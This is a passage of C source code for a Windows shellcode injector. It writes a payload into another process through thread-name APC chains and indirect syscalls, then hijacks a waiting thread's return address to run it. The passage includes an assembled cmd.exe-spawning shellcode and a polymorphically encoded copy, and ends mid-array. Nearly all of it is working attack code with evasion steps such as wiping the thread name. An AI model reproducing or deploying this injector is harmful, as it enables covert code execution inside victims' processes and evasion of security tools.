    NTSTATUS                    ntStatus            = STATUS_SUCCESS;
#ifdef PEB_SCRATCH_SLOT_OFFSET
    PROCESS_BASIC_INFORMATION   ProcessBasicInfo    = { 0 };
#else
    THREAD_BASIC_INFORMATION    ThreadBasicInfo     = { 0 };
#endif
    OBJECT_ATTRIBUTES           ObjAttr             = { 0 };
    LARGE_INTEGER               liTimeout           = { 0 };
    UNICODE_STRING              usName              = { 0 };
    UNICODE_STRING              usEmpty             = { 0 };
    PBYTE                       pPadding            = NULL;
    PVOID                       pScratchSlot        = NULL,
                                pHeapInTgt          = NULL;
    HANDLE                      hLocalEvent         = NULL,
                                hRemoteEvent        = NULL;
    SIZE_T                      cbBytesIO           = 0x00;
    ULONG                       uOffset             = 0x00,
                                uChunks             = 0x00,
                                uRetLen             = 0x00;
    BOOL                        bResult             = FALSE;

    if (!hProcess || !hThread || !pAllocatedAddress || !pShellcodeBuffer || !uShellcodeSize)
        return FALSE;


#ifdef PEB_SCRATCH_SLOT_OFFSET

    // GetThreadDescription writes its heap-allocated name buffer pointer into a caller-supplied PWSTR*, 
    // so we need somewhere inside the target that is a known fixed address we can compute without a prior cross-process write,
    // Also, should never be touched by the OS or the target process itself.
    // The chosen PEB field (see OPTION 1/2 above) fits these requirements. The PEB base comes from
    // NtQueryInformationProcess(ProcessBasicInformation). The APC drops the heap pointer there, we 
    // read it back with NtReadVirtualMemory, then queue the RtlMoveMemory APC that copies from that 
    // heap address to pAllocatedAddress.
    INITIALIZE_SYSCALL(g_APIs.ntQueryInformationProcess);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(hProcess, (ULONG_PTR)ProcessBasicInformation, &ProcessBasicInfo, (ULONG_PTR)sizeof(ProcessBasicInfo), &uRetLen);
    if (!NT_SUCCESS(ntStatus) || !ProcessBasicInfo.PebBaseAddress)
    {
        DBG("[!] NtQueryInformationProcess Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }

    pScratchSlot = (PVOID)((ULONG_PTR)ProcessBasicInfo.PebBaseAddress + PEB_SCRATCH_SLOT_OFFSET);

    DBG("[i] Target Scratch Slot: 0x%p (PEB Base: 0x%p)", pScratchSlot, ProcessBasicInfo.PebBaseAddress);

#else
    
    // GetThreadDescription writes its heap-allocated name buffer pointer into a caller-supplied PWSTR*, 
    // so we need somewhere inside the target that is a known fixed address we can compute without a prior cross-process write,
    // Also, should never be touched by the OS or the target process itself.
    // TEB.TlsSlots[63] fits these requirements. The TEB base comes from NtQueryInformationThread
    // (ThreadBasicInformation). TLS slots are 8 bytes each on x64, and TlsAlloc hands out slots
    // bottom-up starting at 0, so slot 63 is almost never claimed. The APC drops the heap pointer 
    // there, we read it back with NtReadVirtualMemory, then queue the RtlMoveMemory APC that copies 
    // from that heap address to pAllocatedAddress.
    INITIALIZE_SYSCALL(g_APIs.ntQueryInformationThread);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, (ULONG_PTR)ThreadBasicInformation, &ThreadBasicInfo, (ULONG_PTR)sizeof(ThreadBasicInfo), &uRetLen);
    if (!NT_SUCCESS(ntStatus) || !ThreadBasicInfo.TebBaseAddress)
    {
        DBG("[!] NtQueryInformationThread Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }
    
    pScratchSlot = (PVOID)((ULONG_PTR)ThreadBasicInfo.TebBaseAddress + TEB_SCRATCH_SLOT_OFFSET);
    
    DBG("[i] Target Scratch Slot: 0x%p (TEB Base: 0x%p, TlsSlots[%d])", pScratchSlot, ThreadBasicInfo.TebBaseAddress, TEB_SCRATCH_SLOT_IDX);

#endif

    // We need a cross-process signal so the Writer knows exactly when the heap pointer has
    // landed in the scratch slot. Therefore we call NtCreateEvent to create us a local event, then
    // NtDuplicateObject mirrors it into the target so an in-target NtSetEvent APC can signal 
    // through the dup'd handle. SynchronizationEvent (auto-reset) means each wait auto-clears, 
    // so we don't need an NtResetEvent call between chunks.
    // When the Writer blocks on NtWaitForSingleObject(hLocalEvent) and the in-target APC chain
    // fires NtSetEvent as its final step, our wait returns and we can safely NtReadVirtualMemory
    // the scratch slot. The heap pointer is then guaranteed to be there by FIFO APC ordering.
    InitializeObjectAttributes(&ObjAttr, NULL, 0, NULL, NULL);

    INITIALIZE_SYSCALL(g_APIs.ntCreateEvent);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(&hLocalEvent, EVENT_ALL_ACCESS, &ObjAttr, (ULONG_PTR)SynchronizationEvent, (ULONG_PTR)FALSE);
    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtCreateEvent Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }
   
    DBG("[i] Local Sync Event Created: 0x%0.8X", hLocalEvent);

    // Duplicate into the target so the target-side NtSetEvent APC has a valid handle.
    INITIALIZE_SYSCALL(g_APIs.ntDuplicateObject);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(
        NtCurrentProcess(),                                                 // SourceProcessHandle
        hLocalEvent,                                                        // SourceHandle
        hProcess,                                                           // TargetProcessHandle
        &hRemoteEvent,                                                      // TargetHandle 
        EVENT_ALL_ACCESS,                                                   // DesiredAccess
        (ULONG_PTR)0,                                                       // HandleAttributes
        (ULONG_PTR)0                                                        // Options 
    );
    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtDuplicateObject Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    DBG("[i] Event Handle Duplicated Into Target: 0x%0.8X", hRemoteEvent);

    //
    // Per-chunk chain:
    //
    //   1.             NtSetInformationThread(ThreadName)          : Stash chunk in ETHREAD->ThreadName
    //   2. (APC #1)    [RtlFillMemory(scratch, 8, 0)]              : Zero slot inside target (no cross-proc write)
    //   3. (APC #2)    [GetThreadDescription(-2, scratch)]         : Target heap-allocates, writes ptr to slot
    //   4. (APC #3)    [NtSetEvent(hRemoteEvent)]                  : Signal Writer from inside target
    //   5. (OPTIONAL)  NtAlertThread                               : Drain APCs #1-#3 
    //   6.             NtWaitForSingleObject(hLocalEvent)          : Block until APC #3 fires
    //   7.             NtReadVirtualMemory(scratch)                : Pull heap pointer back to Writer
    //   8. (APC #3)    [RtlMoveMemory(dst, heapPtr, len)]          : Copy heap stash to final destination
    //   9.             NtAlertThread                               : Drain APC #3 before next iteration
    //
    while (uOffset < uShellcodeSize)
    {
        ULONG uChunk = ((uShellcodeSize - uOffset) < MAX_THREAD_NAME_LEN) ? (uShellcodeSize - uOffset) : MAX_THREAD_NAME_LEN;

        // Stash chunk as the thread's name.
        // RtlInitUnicodeString sets Length by scanning for L'\0', 
        // so raw shellcode would truncate at the first null byte. Seed Length with an
        // 'A'-filled buffer of the right size, then overwrite Buffer with the real (null-containing)
        // bytes before the syscall copies them into the kernel pool.
        if (!(pPadding = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uChunk + sizeof(WCHAR))))
        {
            DBG("[!] HeapAlloc Failed With Error: %lu", GetLastError());
            goto _END_OF_FUNC;
        }
        
        RtlFillMemory(pPadding, uChunk, 'A');
        g_APIs.pRtlInitUnicodeString(&usName, (PCWSTR)pPadding);
        RtlCopyMemory(usName.Buffer, &pShellcodeBuffer[uOffset], uChunk);

        // Run NtSetInformationThread(ThreadNameInformation)
        INITIALIZE_SYSCALL(g_APIs.ntSetInformationThread);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, (ULONG_PTR)ThreadNameInformation, &usName, (ULONG_PTR)sizeof(UNICODE_STRING));
        HeapFree(GetProcessHeap(), 0x00, pPadding);
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtSetInformationThread [Chunk @ %lu] Failed With Error: 0x%0.8X", uOffset, ntStatus);
            goto _END_OF_FUNC;
        }

        // APC #1: 
        // RtlFillMemory zeroes the scratch slot in-target, clearing any stale heap pointer from the previous chunk.
        // NtQueueApcThread Running RtlFillMemory(pScratchSlot, sizeof(PVOID), 0x00);
        INITIALIZE_SYSCALL(g_APIs.ntQueueApcThread);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, g_APIs.pRtlFillMemory,
            pScratchSlot,                                                   // Destination
            (PVOID)(ULONG_PTR)sizeof(PVOID),                                // Length 
            (PVOID)0x00                                                     // Fill byte
        );
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtQueueApcThread [RtlFillMemory @ %lu] Failed With Error: 0x%0.8X", uOffset, ntStatus);
            goto _END_OF_FUNC;
        }

        // APC #2: GetThreadDescription reads thread name, heap-allocates in the target, 
        // and writes the heap pointer into our scratch slot.
        // 
        // NtQueueApcThread Running GetThreadDescription(NtCurrentThread(), pScratchSlot);
        pHeapInTgt = NULL;
        INITIALIZE_SYSCALL(g_APIs.ntQueueApcThread);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, g_APIs.pGetThreadDescription,
            (PVOID)NtCurrentThread(),                                       // -2, always valid in target
            pScratchSlot,                                                   // PWSTR* receiver
            NULL
        );
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtQueueApcThread [GetThreadDescription @ %lu] Failed With Error: 0x%0.8X", uOffset, ntStatus);
            goto _END_OF_FUNC;
        }

        // APC #3: NtSetEvent signals hRemoteEvent in-target. FIFO ordering guarantees this fires
        // after #1 and #2, so when the Writer's NtWaitForSingleObject returns, the heap pointer
        // is in the scratch slot and ready to read.
        // 
        // NtQueueApcThread Running NtSetEvent(hRemoteEvent);
        INITIALIZE_SYSCALL(g_APIs.ntQueueApcThread);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, g_APIs.pNtSetEvent,
            hRemoteEvent,                                                   // Event handle (valid in target)
            NULL,                                                           // PreviousState (ignored)
            NULL
        );
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtQueueApcThread [NtSetEvent @ %lu] Failed With Error: 0x%0.8X", uOffset, ntStatus);
            goto _END_OF_FUNC;
        }

        /*
        // Drain APCs #1-#3. NtAlertThread wakes the target's alertable wait with STATUS_ALERTED,
        // forcing the queued user-mode APCs to run in before the wait returns.
        INITIALIZE_SYSCALL(g_APIs.ntAlertThread);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread);
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtAlertThread Failed With Error: 0x%0.8X", ntStatus);
            goto _END_OF_FUNC;
        }
        */

        // Block on the event, wakes when APC #3 fires inside target
        liTimeout.QuadPart = -((LONGLONG)TNC_WAIT_TIMEOUT_MS * 10000LL);

        INITIALIZE_SYSCALL(g_APIs.ntWaitForSingleObject);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hLocalEvent, (ULONG_PTR)FALSE, &liTimeout);
        if (ntStatus == STATUS_TIMEOUT)
        {
            DBG("[!] NtWaitForSingleObject Timed Out [@ Offset %lu]. Target Thread Didn't Drain APCs in %ums", uOffset, TNC_WAIT_TIMEOUT_MS);
            goto _END_OF_FUNC;
        }
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X", ntStatus);
            goto _END_OF_FUNC;
        }

        // Read the scratch slot, heap pointer is guaranteed to be there now
        INITIALIZE_SYSCALL(g_APIs.ntReadVirtualMemory);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hProcess, pScratchSlot, &pHeapInTgt, (ULONG_PTR)sizeof(PVOID), &cbBytesIO);
        if (!NT_SUCCESS(ntStatus) || !pHeapInTgt)
        {
            DBG("[!] NtReadVirtualMemory [@ Offset %lu] Failed With Error: 0x%0.8X", uOffset, ntStatus);
            goto _END_OF_FUNC;
        }

        // APC #4: RtlMoveMemory copies the chunk from the target heap buffer (where
        // GetThreadDescription stashed it) to its final home at pAllocatedAddress + uOffset.
        // This is the only step that actually writes the payload to its destination region.
        //
        // NtQueueApcThread Running RtlMoveMemory((ULONG_PTR)pAllocatedAddress + uOffset, pHeapInTgt, uChunk);
        INITIALIZE_SYSCALL(g_APIs.ntQueueApcThread);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, g_APIs.pRtlMoveMemory,
            (PVOID)((ULONG_PTR)pAllocatedAddress + uOffset),                // Destination
            pHeapInTgt,                                                     // Source
            (PVOID)(ULONG_PTR)uChunk                                        // Length
        );
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtQueueApcThread [RtlMoveMemory @ %lu] Failed With Error: 0x%0.8X", uOffset, ntStatus);
            goto _END_OF_FUNC;
        }

        // Drain APC #4 before the next iteration overwrites the thread name
        INITIALIZE_SYSCALL(g_APIs.ntAlertThread);
        (VOID)INVOKE_SYSCALL(hThread);

        uChunks++;
        uOffset += uChunk;
    }

    // Clear thread name, so that we don't leave shellcode in ETHREAD->ThreadName 
    INITIALIZE_SYSCALL(g_APIs.ntSetInformationThread);
    (VOID)INVOKE_SYSCALL(hThread, (ULONG_PTR)ThreadNameInformation, &usEmpty, (ULONG_PTR)sizeof(UNICODE_STRING));

    /*
    // Close the target-side event handle via an in-target APC 
    INITIALIZE_SYSCALL(g_APIs.ntQueueApcThread);
    (VOID)INVOKE_SYSCALL(hThread, g_APIs.pNtClose, hRemoteEvent, NULL, NULL);
    hRemoteEvent = NULL;  
    */

    DBG("[*] All Chunks Written: %lu Bytes In %lu Chunks @ 0x%p (%lu APCs Dispatched)", uShellcodeSize, uChunks, pAllocatedAddress, (ULONG)(uChunks * 4));

    bResult = TRUE;

    // Execute the shellcode (Optional)
    // In this project, this is never used
    if (bExecuteShellcode)
    {
        INITIALIZE_SYSCALL(g_APIs.ntQueueApcThread);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, pAllocatedAddress, NULL, NULL, NULL);
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtQueueApcThread Failed With Error: 0x%0.8X", ntStatus);
            bResult = FALSE;
            goto _END_OF_FUNC;
        }

        INITIALIZE_SYSCALL(g_APIs.ntAlertThread);
        (VOID)INVOKE_SYSCALL(hThread);

        DBG("[*] Execution APC Queued At 0x%p", pAllocatedAddress);
    }

_END_OF_FUNC:
    if (hLocalEvent)
    {
        INITIALIZE_SYSCALL(g_APIs.ntClose);
        (VOID)INVOKE_SYSCALL(hLocalEvent);
    }

    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// HijackThreadReturnAddress is based on "WAITING THREAD HIJACKING" 
// (https://research.checkpoint.com/2025/waiting-thread-hijacking)


// The following stub is from the aforementioned blog.
// 
// g_WthStub's Byte layout:
//
//   [+0x00 .. +0x07] : 8-byte data slot. This holds the thread's original return address.
//                      Left as 0x00 bytes here and copied as-is by WriteMemoryViaThreadNameApc.
//                      (zero bytes are a no-op in WriteMemoryApc). The Flipper
//                      later fills it via an in-target RtlMoveMemory APC that copies the
//                      saved RET straight from the thread's stack ([Rsp]).
//   [+0x08 .. +0x44] : stub prologue (pushf + push all GPRs), 'call +0x1F' into the main
//                      payload, epilogue (pop all GPRs + popf), then 'jmp qword ptr [rip-0x45]'
//                      which dereferences the data slot and resumes the original caller.
//   [+0x45 .. ]      : main payload. this must end on a 'ret' so the stub's epilogue runs.
//
static UCHAR g_WthStub[] =
{
    // Return address place holder 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

    // Prologue: pushf + save all GPRs 
    0x66, 0x9C,                                             // pushf
    0x50, 0x51, 0x52, 0x53, 0x55, 0x56, 0x57,               // push rax rcx rdx rbx rbp rsi rdi
    0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53,         // push r8 r9 r10 r11
    0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,         // push r12 r13 r14 r15

    // Call into the main payload at offset +0x45
    0xE8, 0x1F, 0x00, 0x00, 0x00,

    // Epilogue: restore GPRs + popf
    0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,         // pop  r15 r14 r13 r12
    0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58,         // pop  r11 r10 r9 r8
    0x5F, 0x5E, 0x5D, 0x5B, 0x5A, 0x59, 0x58,               // pop  rdi rsi rbp rbx rdx rcx rax
    0x66, 0x9D,                                             // popf

    // Reads the saved return address from the data slot at stub[0..7]
    // and jumps to it, resuming the thread's original caller
    0xFF, 0x25, 0xBB, 0xFF, 0xFF, 0xFF                      // jmp qword ptr [rip-0x45] 
};

#define WTH_STUB_SIZE           (sizeof(g_WthStub))    
#define WTH_STUB_CODE_OFFSET    0x08                    // Skip the 8-byte data slot to land on 'pushf' and start execution from there


static BOOL HijackThreadReturnAddress(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pInjectedShellcode, IN SIZE_T cbShellcodeSize)
{
    CONTEXT         ThreadCtx           = { .ContextFlags = CONTEXT_CONTROL };
    PVOID           pFlipAddress        = pInjectedShellcode;
    SIZE_T          cbFlipSize          = cbShellcodeSize;
    ULONG           uOldProtect         = 0x00;
    NTSTATUS        ntStatus            = STATUS_SUCCESS;

    if (!hProcess || !hThread || !pInjectedShellcode || !cbShellcodeSize)
        return FALSE;

    // Fetch RSP via NtGetContextThread
    INITIALIZE_SYSCALL(g_APIs.ntGetContextThread); 
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, &ThreadCtx);
    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtGetContextThread Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }

    DBG("[i] Fetched Thread Context: Rsp=0x%p, Rip=0x%p", (PVOID)ThreadCtx.Rsp, (PVOID)ThreadCtx.Rip);


    // APC copies the 8-byte original RET from the thread's own stack ([Rsp]) directly
    // into the stub's data slot (pInjectedShellcode[0..7]). 
    //
    // Queued first for FIFO reasons: when the alert fires, the data slot must already
    // be valid before the stack hand-off APC rewrites [Rsp], since the thread is one
    // 'ret' away from entering the stub and immediately jumping through that slot.
    //
    // NtQueueApcThread Running RtlMoveMemory(pInjectedShellcode, RSP, 8);
    INITIALIZE_SYSCALL(g_APIs.ntQueueApcThread);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, g_APIs.pRtlMoveMemory,
        (PVOID)pInjectedShellcode,                                              // Destination  
        (PVOID)ThreadCtx.Rsp,                                                   // Source      
        (PVOID)sizeof(ULONG_PTR)                                                // Length       
    );
    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtQueueApcThread Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }

    DBG("[+] Data-Slot Plant Queued; Saving RET From [Rsp]=0x%p Into Stub @ 0x%p", (PVOID)ThreadCtx.Rsp, pInjectedShellcode);

    // Flip memory protection to RWX (The shellcode is polymorphic and requires write access to decode)
    INITIALIZE_SYSCALL(g_APIs.ntProtectVirtualMemory);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(hProcess, &pFlipAddress, &cbFlipSize, PAGE_EXECUTE_READWRITE, &uOldProtect);
    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }

    DBG("[+] Flipped Protection From 0x%X to RWX", uOldProtect);

    // APC copies 8 pre-planted bytes from pInjectedShellcode's tail into [Rsp].
    // The hijack pointer was planted there by the Writer in WriterChildMain before invoking
    // WriteMemoryViaThreadNameApc.
    // 
    // So by the time the Flipper runs, those 8 bytes already sit at (pInjectedShellcode + cbShellcodeSize - 8) in the target.
    // The APC just copies them in-place.
    //
    // data-slot plant APC runs first (saves RET into the stub), stack
    // hand-off APC runs second ([Rsp] <- hijack pointer). 
    //
    // NtQueueApcThread Running RtlMoveMemory(RSP, Shellcode Entry, 8);
    INITIALIZE_SYSCALL(g_APIs.ntQueueApcThread);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, g_APIs.pRtlMoveMemory,
        (PVOID)ThreadCtx.Rsp,                                                            // Destination 
        (PVOID)((ULONG_PTR)pInjectedShellcode + cbShellcodeSize - sizeof(ULONG_PTR)),    // Source       
        (PVOID)sizeof(ULONG_PTR)                                                         // Length       
    );
    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtQueueApcThread Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }

    DBG("[+] Return Address Hijack Queued @ 0x%p", (PVOID)((ULONG_PTR)pInjectedShellcode + WTH_STUB_CODE_OFFSET));

    // Force the wake.
    // This is optional, however in case not called, shellcode execution will be
    // delayed until the target thread wakes on its own. That could be milliseconds, hours, or
    // never, depending on how busy the target process is.
    INITIALIZE_SYSCALL(g_APIs.ntAlertThread);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread);
    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtAlertThread Failed With Error: 0x%0.8X",ntStatus);
    }
    else
    {
        DBG("[+] Thread Alerted; APCs Should Fire Immediately");
    }

    return TRUE;
}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


/*

// Custom x64 cmd.exe shellcode:
//
//   0:  53                      push   rbx
//   1:  56                      push   rsi
//   2:  57                      push   rdi
//   3:  55                      push   rbp
//   4:  54                      push   rsp
//   5:  58                      pop    rax
//   6:  66 83 e4 f0             and    sp,0xfff0
//   a:  50                      push   rax
//   b:  6a 60                   push   0x60
//   d:  5a                      pop    rdx
//   e:  68 63 6d 64 00          push   0x646d63
//   13: 54                      push   rsp
//   14: 59                      pop    rcx
//   15: 48 29 d4                sub    rsp,rdx
//   18: 65 48 8b 32             mov    rsi,QWORD PTR gs:[rdx]
//   1c: 48 8b 76 18             mov    rsi,QWORD PTR [rsi+0x18]
//   20: 48 8b 76 10             mov    rsi,QWORD PTR [rsi+0x10]
//   24: 48 ad                   lods   rax,QWORD PTR ds:[rsi]
//   26: 48 8b 30                mov    rsi,QWORD PTR [rax]
//   29: 48 8b 7e 30             mov    rdi,QWORD PTR [rsi+0x30]
//   2d: 03 57 3c                add    edx,DWORD PTR [rdi+0x3c]
//   30: 8b 5c 17 28             mov    ebx,DWORD PTR [rdi+rdx*1+0x28]
//   34: 8b 74 1f 20             mov    esi,DWORD PTR [rdi+rbx*1+0x20]
//   38: 48 01 fe                add    rsi,rdi
//   3b: 8b 54 1f 24             mov    edx,DWORD PTR [rdi+rbx*1+0x24]
//   3f: 0f b7 2c 17             movzx  ebp,WORD PTR [rdi+rdx*1]
//   43: 8d 52 02                lea    edx,[rdx+0x2]
//   46: ad                      lods   eax,DWORD PTR ds:[rsi]
//   47: 81 3c 07 57 69 6e 45    cmp    DWORD PTR [rdi+rax*1],0x456e6957
//   4e: 75 ef                   jne    0x3f
//   50: 8b 74 1f 1c             mov    esi,DWORD PTR [rdi+rbx*1+0x1c]
//   54: 48 01 fe                add    rsi,rdi
//   57: 8b 34 ae                mov    esi,DWORD PTR [rsi+rbp*4]
//   5a: 48 01 f7                add    rdi,rsi
//   5d: 99                      cdq
//   5e: 48 c7 c2 05 00 00 00    mov    rdx,0x5
//   65: ff d7                   call   rdi
//   67: 48 83 c4 68             add    rsp,0x68
//   6b: 5c                      pop    rsp
//   6c: 5d                      pop    rbp
//   6d: 5f                      pop    rdi
//   6e: 5e                      pop    rsi
//   6f: 5b                      pop    rbx
//   70: c3                      ret

static UCHAR x64CmdShellcode[] =
{
    0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
    0x60, 0x5A, 0x68, 0x63, 0x6D, 0x64, 0x00, 0x54, 0x59, 0x48, 0x29, 0xD4,
    0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
    0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
    0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
    0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
    0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0x48, 0xC7,
    0xC2, 0x05, 0x00, 0x00, 0x00, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x68, 0x5C,
    0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

*/


// .\AlphabeticalPolyGen.exe --i .\x64CmdShellcode.bin --o .\x64CmdShellcode.bin.poly
// https://github.com/Maldev-Academy/AlphabeticalPolyShellGen
static UCHAR x64CmdShellcode[] =
{
    0x4D, 0x8D, 0x1B, 0x4D, 0x8D, 0x1C, 0x03, 0x31, 0xC9, 0xEB, 0x23, 0x5F, 0x57, 0x30, 0xC9, 0x80,
    0xC9, 0x86, 0x88, 0xCB, 0xF6, 0xDB, 0x80, 0xC3, 0xF1, 0x80, 0xC3, 0x86, 0x30, 0x1F, 0x48, 0xFF,
    0xC7, 0xE2, 0xEF, 0x5F, 0xFF, 0xE7, 0x4D, 0x8D, 0x24, 0x24, 0x4D, 0x8D, 0x24, 0x04, 0xE8, 0xD8,
    0xFF, 0xFF, 0xFF, 0xA2, 0xA4, 0xA4, 0xA1, 0xBD, 0x7F, 0x12, 0x10, 0xF9, 0xFA, 0xFB, 0xFC, 0xA3,
    0xB6, 0x7C, 0xC6, 0x7B, 0xB9, 0xE1, 0x04, 0x05, 0x06, 0x8E, 0xD7, 0xD8, 0xE5, 0x3A, 0xC5, 0x34,
    0xF7, 0x7C, 0x30, 0x1E, 0xA5, 0x17, 0x5A, 0x54, 0x9E, 0xD7, 0xD9, 0xF1, 0x12, 0x5A, 0x94, 0xDC,
    0x5F, 0x9F, 0xD0, 0x6A, 0x63, 0xE3, 0xEC, 0x21, 0x63, 0x0F, 0xE0, 0x6D, 0xA2, 0x2F, 0x22, 0xD2,
    0xEF, 0xC4, 0xEC, 0xB8, 0xCA, 0xB0, 0xD4, 0xC9, 0xF7, 0xDF, 0x3A, 0x08, 0xF3, 0x02, 0xFD, 0x4E,
    0x33, 0xB4, 0x54, 0xCF, 0x83, 0x81, 0x54, 0xCC, 0x52, 0xC9, 0xB7, 0x88, 0xA1, 0xA4, 0x1B, 0x1B,
    0x06, 0xC6, 0xA0, 0x19, 0x53, 0xAB, 0x1C, 0xDC, 0xAF, 0x1F, 0x69, 0x8B, 0x12, 0xDE, 0x95, 0x29,
    0x54, 0xD7, 0x70, 0x29, 0x9D, 0xA3, 0x2C, 0x9A, 0xAF, 0x8C, 0x99, 0x37, 0x35, 0x23, 0xE5, 0x81,
    0x33, 0x30, 0x38, 0xF8, 0x82, 0x2D, 0x2F, 0x8A, 0x96, 0x47, 0x69, 0x47, 0x6B, 0x47, 0x6D, 0x46,
    0x7A, 0x45, 0x7A, 0x44, 0x6D, 0x47, 0x6C, 0x41, 0x48, 0x62, 0x42, 0x56, 0x67, 0x4E, 0x6C, 0x6E,
    0x62, 0x45, 0x78, 0x50, 0x4E, 0x50, 0x51, 0x46, 0x76, 0x4C, 0x70, 0x41, 0x4C, 0x47, 0x53, 0x50,
    0x4D, 0x43, 0x57, 0x79, 0x4F, 0x50, 0x58, 0x67, 0x7A, 0x4B, 0x75, 0x41, 0x6E, 0x50, 0x4C, 0x47,
    0x78, 0x45, 0x6A, 0x4C, 0x58, 0x70, 0x6B, 0x45, 0x55, 0x46, 0x5A, 0x4D, 0x50, 0x42, 0x48, 0x4B,
    0x75, 0x47, 0x78, 0x4B, 0x75, 0x42, 0x48, 0x49, 0x73, 0x46, 0x45, 0x44, 0x72, 0x61, 0x72, 0x47,
    0x78, 0x50, 0x5A, 0x43, 0x44, 0x71, 0x73, 0x4E, 0x4D, 0x43, 0x69, 0x42, 0x68, 0x66, 0x47, 0x50,
    0x55, 0x4C, 0x51, 0x73, 0x63, 0x44, 0x65, 0x47, 0x4C, 0x4C, 0x72, 0x6B, 0x77, 0x47, 0x78, 0x4E,
    0x4F, 0x42, 0x6C, 0x4D, 0x51, 0x61, 0x4E, 0x4C, 0x51, 0x43, 0x69, 0x54, 0x64, 0x48, 0x79, 0x51,
    0x75, 0x74, 0x46, 0x67, 0x41, 0x41, 0x4E, 0x4C, 0x6E, 0x50, 0x5A, 0x46, 0x67, 0x50, 0x75, 0x4D,
    0x59, 0x47, 0x4B, 0x4D, 0x71, 0x50, 0x43, 0x70, 0x6E, 0x42, 0x71, 0x4C, 0x54, 0x4B, 0x75, 0x57,
    0x4D, 0x4C, 0x72, 0x4B, 0x75, 0x47, 0x78, 0x4C, 0x6F, 0x50, 0x69, 0x6D, 0x61, 0x41, 0x6C, 0x49,
    0x72, 0x50, 0x69, 0x5A, 0x4A, 0x4E, 0x59, 0x4A, 0x77, 0x6E, 0x52, 0x4C, 0x70, 0x4A, 0x4E, 0x4C,
    0x6B, 0x4E, 0x79, 0x41, 0x58, 0x4C, 0x70, 0x6F, 0x43, 0x56, 0x69, 0x47, 0x64, 0x44, 0x6D, 0x4A,
